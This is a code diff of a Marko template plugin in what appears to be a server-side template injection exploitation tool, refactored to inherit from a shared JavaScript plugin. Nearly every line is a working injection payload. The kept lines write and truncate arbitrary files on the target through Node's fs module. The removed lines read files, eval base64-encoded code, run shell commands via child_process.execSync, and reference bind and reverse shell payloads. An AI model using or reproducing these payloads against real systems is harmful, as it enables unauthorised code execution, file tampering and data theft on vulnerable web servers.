@@ -1,12 +1,12 @@
 from utils.strings import quote
-from core.plugin import Plugin
+from plugins.languages import javascript
 from core import languages
 from utils.loggers import log
 from utils import rand
 import base64
 import re
 
-class Marko(Plugin):
+class Marko(javascript.Javascript):
     
     def init(self):
 
@@ -25,37 +25,8 @@ class Marko(Plugin):
             },
             'write' : {
                 'call' : 'inject',
-                'write' : """${require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')}""",
-                'truncate' : """${require('fs').writeFileSync('%(path)s', '')}"""
-            },
-            'read' : {
-                'call': 'evaluate',
-                'read' : """require('fs').readFileSync('%(path)s').toString('base64')"""
-            },
-            'md5' : {
-                'call': 'evaluate',
-                'md5': """require('crypto').createHash('md5').update(require('fs').readFileSync('%(path)s')).digest("hex")"""
-            },
-            'evaluate' : {
-                'call': 'render',
-                'evaluate' : """${eval(Buffer('%(code_b64)s', 'base64').toString())}""",
-            },
-            'execute' : {
-                'call': 'evaluate',
-                'execute': """require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())"""
-            },
-            'blind' : {
-                'call': 'execute_blind',
-                'bool_true' : 'true',
-                'bool_false' : 'false'
-            },
-            'bind_shell' : {
-                'call' : 'execute_blind',
-                'bind_shell': languages.bash_bind_shell
-            },
-            'reverse_shell' : {
-                'call': 'execute_blind',
-                'reverse_shell' : languages.bash_reverse_shell
+                'write' : """${require('fs').appendFileSync('%(path)s',Buffer('%(chunk_b64)s','base64'),'binary')}""",
+                'truncate' : """${require('fs').writeFileSync('%(path)s','')}"""
             },
             'execute_blind' : {
                 'call': 'inject',
